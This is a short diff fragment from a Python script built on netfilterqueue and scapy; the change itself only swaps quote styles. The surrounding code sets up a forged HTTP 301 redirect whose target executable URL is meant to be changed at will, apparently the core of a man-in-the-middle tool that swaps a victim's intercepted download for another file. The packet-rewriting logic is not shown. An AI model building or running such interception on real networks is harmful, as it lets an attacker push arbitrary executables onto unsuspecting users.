@@ -3,14 +3,14 @@ import netfilterqueue
 import scapy.all as scapy
 
 # Example 301 Response from wikipedia
-'''
+"""
 HTTP/1.1 301 Moved Permanently
 Location: https://www.example.org/index.asp
-'''
+"""
 # Example Link for replacing
-'''
+"""
 https://www.transformice.com/Transformice.exe
-'''
+"""
 
 target_link = 'https://www.transformice.com/Transformice.exe' # Change this parameter as you wish
 link = 'HTTP/1.1 301 Moved Permanently\nLocation: ' + target_link + '\n\n'
